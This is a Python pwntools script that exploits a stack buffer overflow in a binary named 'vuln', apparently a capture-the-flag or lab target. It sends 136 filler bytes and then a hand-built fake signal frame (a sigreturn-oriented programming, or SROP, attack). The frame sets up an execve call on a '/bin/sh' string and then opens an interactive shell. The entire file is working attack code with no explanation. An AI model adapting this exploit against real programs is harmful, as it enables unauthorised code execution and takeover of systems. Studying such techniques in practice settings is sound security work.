#!/usr/bin/env python3
from pwn import *

p = ELF('vuln', checksec=0).process(env={})

bin_sh = 0x00475020+21
restore_rt = 0x00462170
syscall = 0x00000000004011b8

sigframe = p64(restore_rt) # pretcode (return address)
sigframe += p64(0x0000000000000007) # uc_flags
sigframe += p64(0) # uc_link
sigframe += p64(0) # uc_stack.ss_sp
sigframe += p64(0x0000ffff00000000) # uc_stack.ss_flags
sigframe += p64(0) # uc_stack.ss_size
sigframe += p64(0)*8 # r8-r15
sigframe += p64(bin_sh) # rdi
sigframe += p64(0) # rsi
sigframe += p64(0) # rbp
sigframe += p64(0) # rbx
sigframe += p64(0) # rdx
sigframe += p64(59) # rax
sigframe += p64(0) # rcx
sigframe += p64(0) # rsp
sigframe += p64(syscall) # rip
sigframe += p64(0x0000000000000202) # eflags
sigframe += p64(0x002b000000000033) # ss, fs, gs, cs
sigframe += p64(0) # err
sigframe += p64(1) # trapno
sigframe += p64(0)*3
sigframe += p64(0xe) # reserved
sigframe += p64(0) # uc_sigmask

offset=136
payload = b'A'*offset
payload += sigframe

pause()
p.send(payload)
p.interactive()
